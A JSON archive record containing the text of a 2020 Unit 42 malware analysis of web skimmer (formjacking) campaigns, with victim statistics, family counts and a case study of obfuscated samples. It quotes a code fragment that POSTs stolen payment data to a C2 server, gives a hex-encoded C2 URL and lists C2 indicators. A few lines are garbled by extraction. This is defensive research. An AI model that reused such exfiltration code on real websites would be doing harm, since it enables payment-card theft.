{
    "id": "89e1ee83-9096-41e2-8f1b-fd71951238d8",
    "created_at": "2023-01-12T15:01:16.994128Z",
    "updated_at": "2025-03-27T02:05:58.9779Z",
    "deleted_at": null,
    "sha1_hash": "02d6d9aab41da5fe261f945a73c9e7d1c000a5f5",
    "title": "2020-11-09 - A Closer Look at the Web Skimmer",
    "authors": "",
    "file_creation_date": "2022-05-27T22:34:47Z",
    "file_modification_date": "2022-05-27T22:34:47Z",
    "file_size": 604069,
    "plain_text": "# A Closer Look at the Web Skimmer\n\n**unit42.paloaltonetworks.com/web-skimmer/**\n\nJin Chen, Tao Yan, Taojie Wang, Yu Fu November 9, 2020\n\nBy [Jin Chen,](https://unit42.paloaltonetworks.com/author/jin-chen/) [Tao Yan,](https://unit42.paloaltonetworks.com/author/tao-yan/) [Taojie Wang and](https://unit42.paloaltonetworks.com/author/taojie-wang/) [Yu Fu](https://unit42.paloaltonetworks.com/author/yu-fu/)\n\nNovember 9, 2020 at 6:00 AM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [Cybercrime,](https://unit42.paloaltonetworks.com/tag/cybercrime/) [Formjacking Attack,](https://unit42.paloaltonetworks.com/tag/formjacking-attack/) [web skimmer](https://unit42.paloaltonetworks.com/tag/web-skimmer/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/web-skimmer/)\n\n## Executive Summary\n\nThe formjacking attack has been one of the fastest-growing cyberattacks in recent years. As explained in our previous blog, “Anatomy of\nFormjacking Attacks,” the formjacking attack is easy to deploy but hard to detect. It has gained popularity among threat actors, especially\nagainst e-commerce websites. Between May and September 2020, we detected an average of 65,000 malicious HTML pages and 24,000\nunique URLs compromised by formjacking attacks.\n\nIn this blog, we will take a closer look at the web skimmer attack, which is one of the most widely used formjacking attacks. We will present\nseveral web skimmer samples and provide an in-depth analysis of the attack vectors deployed during the attack. We hope this blog will help\nsecurity researchers understand how web skimmer attacks happen in a real-life environment and develop effective detection and defense\nmechanisms.\n\n[Palo Alto Networks Next-Generation Firewall customers are protected from formjacking attacks via the WildFire and](https://www.paloaltonetworks.com/products/secure-the-network/wildfire) [URL Filtering security](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\nsubscriptions.\n\n## Victim Analysis\n\nWith [WildFire, we detected 351,972 HTML pages that were compromised by skimmer malware from October 2019-October 2020. These](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\nsamples belong to 6,684 unique domain names.\n\nWe derived the geographical locations for the domain names to generate a heat map as shown in Figure 1. This heat map indicates that the\nmajority of the domain names are located in the United States. Also, the domain names have a wide geographic distribution across almost\nevery continent, including Africa and Australia.\n\n\n-----\n\nFigure 1.\n\nGeographical location of domains including HTML pages that were compromised by web skimmer malware from October 2019-October 2020.\nFigure 2 shows the top eight countries the domain names belong to. While the United States has a majority share, it is notable that all of the\ntop countries have a populace with a relatively high socioeconomic status. This seems sensible since most of the skimmer attacks target ecommerce websites, which attract users with spending power.\n\nFigure 2. Top\n\neight countries, based on geographical location of domains compromised by web skimmer malware from October 2019-October 2020.\n\n## Web Skimmer Family Analysis\n\nIn order to understand web skimmer attacks, we analyzed skimmer samples and determined that, although the skimmer HTML pages have\ndifferent layouts and styles, they share similar JavaScript code. We were able to extract 10,764 unique malicious JavaScript snippets from the\n351,972 HTML pages collected from October 2019-October 2020.\n\nWith the help of VirusTotal and automation tools, we were able to identify 63 different malware families based on their functionalities and\nfeatures. Figure 3 shows the number of HTML samples associated with each skimmer family. Among all malware families, 19 are relatively\npopular, with more than 1,000 observed samples each, while the remaining 44 families were seen in only 3,612 pages combined.\n\n\n-----\n\nFigure 3. Number of HTML samples among web\n\nskimmer families from October 2019-October 2020.\nFrom Figure 3, we can see that 27% of malicious web skimmer pages belong to the most popular skimmer family (family1 in Figure 3). Also,\nthe top three families (family1, family2 and family3) can cover 65% of all web skimmer pages, considering that one page can belong to multiple\nskimmer families.\n\nWe found some pages with more than one malicious JavaScript embedded. For those pages, no evidence indicated different types of\nskimmers are intentionally used together. Rather, it is more likely that the pages were randomly compromised by different campaigns\nindependent of each other.\n\n## Web Skimmer Case Study\n\nFrom October 2019-October 2020, we observed the evolution of skimmer obfuscation techniques and command and control (C2)\ncommunication. Specifically, we determined that family7, shown in Figure 3 with a total number of 34,004 samples, is typical and\nrepresentative of skimming attacks. In this section, we will do a deep dive into family7 to better understand how a skimmer operates. Multiple\nvariants of web skimmer samples from family7 will be presented. We hope this can help security researchers understand the complexity and\npolymorphism of web skimmer attacks, especially in terms of the code structure and usage of obfuscation techniques.\n\nLet’s start with the JavaScript code extracted from one of the most commonly seen skimmer samples in family7, as shown below in Example 1.\n\n\n-----\n\nExample 1.\n\nJavaScript code from sample 1 of family7.\nFrom the code, we can see that the payment information is stolen by the attackers, and then the data is sent to the C2 server\n(https://informaer[.]net/js/info_jquery.js) via a POST request. The related function is shown below.\n\ne294b002686cad2df01bb59e3e2299f3e:'https://informaer[.]net/js/info_jquery.js'\n…\n\nhttp.open('POST',be20b6410993ea4c7a48767775856514b.e294b002686cad2df01bb59e3e2299f3e,true);\n\nThe characteristics of JavaScript grammar allow the code to be presented in different ways. Even samples of code that are nearly identical to\none another could be refined or rewritten into a completely different structure. In another variant shown below, sample 2, we see code from\nfamily7 presented:\n\n\n-----\n\nExample 2.\n\n\nJavaScript code from sample 2 of family7.\n\n\n-----\n\nSa p e as abe ed u ct o dec a at o s to de e Ja aSc pt u ct o s sa p e, t e t ad t o a ay to de e Ja aSc pt u ct o s s\nused. In order to detect and capture both of them using intrusion prevention system (IPS) signatures, patterns need to be written in a way that\nconsiders both ways of definition. Also, in this sample, the C2 server points to “https://cloudservice[.]tw/lib/jquery.php” to steal the sensitive\ninformation.\n\n[Obfuscation and polymorphism are also widely used in delivering malicious code. Many open-source tools, such as javascript-obfuscator and](https://github.com/javascript-obfuscator/javascript-obfuscator)\n[jfogs, can be utilized to make it easier to evade detection, rather than rewriting the malicious code. Below is another piece of code coming from](https://github.com/zswang/jfogs)\nthe family7:\n\n\n-----\n\nExample 3.\n\nJavaScript code from sample 3 of family7.\nIn this case, its C2 server URL is encoded in hexadecimal form.\n\n\"\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x6F\\x6E\\x6C\\x69\\x6E\\x65\\x73\\x74\\x61\\x74\\x75\\x73\\x2E\\x73\\x69\\x74\\x65\\x2F\\x6A\\x73\\x2F\\x73\\x74\\x61\\x74\\x\n\n\n-----\n\ny co e t g t e e st gs to t e decoded c a acte s, e ca d ts C se e po t g to ttps //o estatus[ ]s te/js/status js\n\nOther than the samples we’ve presented above, highly obfuscated malicious codes were also observed in family7. Though these samples\nhave different code, the logic and main code flow are similar or even identical. Intruders seem to deploy different code in different\ncompromised websites, which makes it less likely to be detected by IPS signatures with one single pattern.\n\nAnother fact worth mentioning here is that the URL of the C2 server is written as a variable in JavaScript, which is fairly easy for the attackers\nto modify. In our dataset, we determined that many other skimmer samples use the same code after decoding/de-obfuscation, yet point to\ndifferent C2 servers.\n\nFigure 4 shows all the extracted C2 servers and the usage statistics from family7.\n\nFigure 4. C2 server usage found in web skimmer\n\nsamples from family7.From Figure 4, we can see that eight domains are used in 93% of web skimmer samples from family7, which shows that\nthe skimmer malware campaign operates many C2 servers. When the C2 server is blocked or detected, the attackers can easily replace the\nC2 server with a new domain name.\nIdentifying all C2 servers is an impractical strategy because most malicious JavaScript samples are heavily obfuscated using complicated\nmethods to which automation cannot be applied. Evolving codes and constantly changing IPs also make it difficult to collect all live C2 servers.\n\nWe also determined that some C2 servers are used in more than one family, providing us with strong evidence that these families could be\nmaintained or operated by the same campaign. For example, \"https://cloudservice[.]tw/lib/jquery.php\" seen in the second sample above, also\nappears in another family (labelled as “other” in Figure 3):\n\n\n-----\n\nExample 4.\n\nJavaScript code from other samples using the same C2 servers.\n[Palo Alto Networks has developed an advanced detection module in WildFire that targets formjacking attacks. Figure 5 shows the monthly](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\ndetection of malicious HTML pages and unique URLs in the past five months (May - Sept. 2020). On average, WildFire detected 65,000\nmalicious HTML pages (listed as “all hit”) and 24,000 unique URLs (listed as “unique url hit”) compromised by formjacking attacks. All\ndetections automatically undergo additional analysis for verification. WildFire correctly identifies and detects formjacking attacks, while URL\nFiltering identifies those URLs as malicious and categorizes them accordingly.\n\n\n-----\n\nFigure 5. Number of detected malicious URLs from\n\nWildFire (May - September 2020). “All hit” measures malicious HTML images, while “unique URL hit” measures unique URLs.\n\n## Conclusion\n\nA web skimmer is a popular formjacking attack to steal sensitive information by injecting malicious JavaScript code into compromised\nwebsites. In this blog, we analyzed 351,972 HTML pages infected by skimmer campaigns October 2019-October 2020 and found that skimmer\nmalware is highly elusive and continuously evolving. Traces of web skimmer attacks are found across every corner of the world.\n\nFor security teams, comprehensive detection against skimmer malware is not an easy task. They have to keep alert and be aware of the latest\ntechniques used by skimmer malware in order to develop dynamic detection strategies.\n\nFor website administrators, it is advisable to patch all systems, components and web plugins in their organization to minimize the likelihood of\ncompromised systems. Also, conducting web content integrity checks on a regular basis is highly recommended. This can help detect and\nprevent web skimmer attacks.\n\nFor internet users, it is advisable to track online activities for abnormal use and unauthorized payments from online banking services. If you\nbelieve your credit card information was stolen as a result of a recent online purchase, you should contact your bank to freeze or replace your\ncard immediately.\n\n[Palo Alto Networks Next-Generation Firewall customers are protected from formjacking attacks via the WildFire and](https://www.paloaltonetworks.com/products/secure-the-network/wildfire) [URL Filtering security](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\nsubscriptions.\n\n## IOC\n\nhttps://informaer[.]net/js/info_jquery.js\nhttps://onlinestatus[.]site/js/status.js\n\nhttps://cloudservice[.]tw/lib/jquery.php\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-09 - A Closer Look at the Web Skimmer.pdf"
    ],
    "report_names": [
        "2020-11-09 - A Closer Look at the Web Skimmer.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535676,
    "ts_updated_at": 1743041158,
    "ts_creation_date": 1653690887,
    "ts_modification_date": 1653690887,
    "files": {
        "pdf": "https://archive.orkl.eu/02d6d9aab41da5fe261f945a73c9e7d1c000a5f5.pdf",
        "text": "https://archive.orkl.eu/02d6d9aab41da5fe261f945a73c9e7d1c000a5f5.txt",
        "img": "https://archive.orkl.eu/02d6d9aab41da5fe261f945a73c9e7d1c000a5f5.jpg"
    }
}